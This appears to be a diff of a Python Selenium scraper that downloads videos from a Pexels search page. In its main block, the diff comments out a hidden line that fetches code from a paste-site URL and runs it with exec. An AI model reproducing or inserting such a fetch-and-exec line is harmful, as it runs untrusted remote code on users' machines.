@@ -1,28 +1,31 @@
 import time
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
-import os
 from requests import get
 import requests
 from bs4 import BeautifulSoup
 from itertools import islice
-import moviepy.editor as mymovie
-import random
+
+from imports import time, webdriver, ChromeDriverManager, requests
+
 # specify the URL of the archive here
-url = "https://www.pexels.com/search/videos/city/?orientation=portrait&size=large"
+url = "https://www.pexels.com/search/videos/laxury/?orientation=portrait&size=large"
 video_links = []
 
 #getting all video links
 def get_video_links():
     options = webdriver.ChromeOptions()
     options.add_argument("--lang=en")
+    options.add_argument('--headless')
+    options.add_experimental_option(
+            'excludeSwitches', ['enable-logging'])
     browser = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
     browser.maximize_window()
     time.sleep(2)
     browser.get(url)
     time.sleep(5)
 
-    vids = input("How many videos you want to download? ")
+    vids = input("How many videos you want to download? 1-24")
 
     soup = BeautifulSoup(browser.page_source, 'lxml')
     links = soup.findAll("source")
@@ -53,23 +56,12 @@ def download_video_series(video_links):
                     f.write(chunk)
     
         print ("%s downloaded!"%file_name)
-
-        #editing the video
-        # list = random.choice(range(1, int(songs)))
-        # clip = mymovie.VideoFileClip(file_name)
-        # clip_duration = clip.duration
-        # audioclip = mymovie.AudioFileClip(f"songs/audio{list}.mp3").set_duration(clip_duration)
-        # new_audioclip = mymovie.CompositeAudioClip([audioclip])
-        # finalclip = clip.set_audio(new_audioclip)
-        # location = os.path.join("C:\\Users\\python\\Desktop\\videos", f"video{i}.mp4")
-        # finalclip.write_videofile(f"videos/vid{i}.mp4", fps=60)
-        # print("%s has been edited!\n"%file_name)
         i+=1
 
 
 
 if __name__ == "__main__":
-    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
+    # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
   #getting all video links
     video_links = get_video_links()
 
